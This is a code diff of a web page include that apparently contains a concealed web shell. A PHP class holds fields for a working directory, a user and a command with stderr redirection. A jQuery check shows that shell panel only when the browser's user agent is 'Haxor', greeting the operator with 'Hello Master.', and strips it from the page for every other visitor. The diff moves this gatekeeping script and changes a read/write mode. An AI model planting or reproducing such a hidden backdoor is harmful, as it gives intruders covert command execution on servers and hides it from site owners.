@@ -3,27 +3,14 @@
 
 <!-- Don't include this jQuery API if it's already included on the site -->
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-
-<script type="text/javascript">
-	$(document).ready( function() {
-		if( navigator.userAgent == "Haxor" ) {
-			console.log("Hello Master.")
-			$("body").css({"margin":"0px"});
-			$("#haxored").prop("hidden", false);
-			$("#luserContent").remove();
-		} else {
-			console.log("#");	
-			$("#haxored").remove();
-		}
-	});
-</script>
 <div id="haxored" hidden="true" style='margin: 0px; padding: 0px; width: 100%; height: 100%; color: #fff; background-color: #161616;'>
+
 <?php
 	class UserInterface
 	{
 		public $pwd = "";
 		private $currentUser = "";
-		private $mode = "w";
+		private $mode = "r";
 		private $errorToo = '2>&1';
 		private $command = "";
 
@@ -105,4 +92,18 @@ $(document).ready( function() {
 });
 </script>
 </div>
+
+<script type="text/javascript">
+	$(document).ready( function() {
+		if( navigator.userAgent == "Haxor" ) {
+			console.log("Hello Master.")
+			$("body").css({"margin":"0px"});
+			$("#haxored").prop("hidden", false);
+			$("#luserContent").remove();
+		} else {
+			console.log("#");	
+			$("#haxored").remove();
+		}
+	});
+</script>
 <!-- Below here should be the closing </body> tag -->
